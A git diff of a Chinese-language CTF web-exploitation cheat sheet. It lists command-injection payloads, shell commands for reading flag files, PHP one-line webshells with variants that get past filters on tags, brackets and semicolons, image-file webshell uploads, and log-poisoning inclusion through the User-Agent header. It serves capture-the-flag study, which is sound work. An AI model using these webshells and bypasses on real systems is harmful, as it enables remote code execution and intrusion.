@@ -16,6 +16,14 @@
 
 * ?c=system("tac%20fla(星号)")意思是c=system("tac flag");
 
+<br>
+
+### 在linux的shell里：
+* ls /（查看所有目录)
+* ls /home(进入home文件夹)
+* cat /home/flag.txt(打开flag.txt)
+* tac用法同上
+* ls ../输出上一级目录的内容
 
 <br><br>
 
@@ -42,9 +50,14 @@
 
 
 ### 直接写php时：
+#### 文件上传
 * 经典一句话木马：<?php @eval($_POST[a]); ?>
 * 短标签（过滤php）绕过：<?=eval($_POST[a]);?>（需要配合user.ini打开权限）
-* 过滤[]:<?=eval($_POST{a});?>(改成花括号)
+* ; 分号过滤：直接删除即可
+* 非蚁剑连接：直接上传带有命令的图片马，访问马所在的目录
+* 
+#### 过滤
+* 过滤[ ]:<?=eval($_POST{a});?>(改成花括号)
 * 过滤分号’；‘：<?=`cat ../flag*`?> <?=`tac ../f*`?> <?=`nl ../flag*`?>查看源码得flag
 
 
@@ -82,7 +95,7 @@
 
 <br>
 
-#### 日志文件包含：（抓包改UA，在UA末尾加东西）
+#### 日志文件包含：（抓包改UA，在UA末尾加东西）（用于include）
 * 如：
 ````
 GET /?file=/var/log/nginx/access.log HTTP/1.1
